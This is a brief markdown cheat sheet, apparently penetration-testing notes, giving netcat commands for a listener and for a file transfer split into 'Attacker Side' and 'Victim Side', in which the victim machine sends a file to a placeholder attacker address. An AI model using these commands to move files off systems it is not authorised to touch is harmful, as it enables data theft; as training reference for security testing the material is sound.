# Netcat

### Netcat Listener
```
nc -lvnp <port>
```

### Netcat File Transfer
#### Attacker Side
```
nc -l -p <port> -q 1 > <file> < /dev/null
```
#### Victim Side
```
nc <attacker_ip> <port> < <file>
```
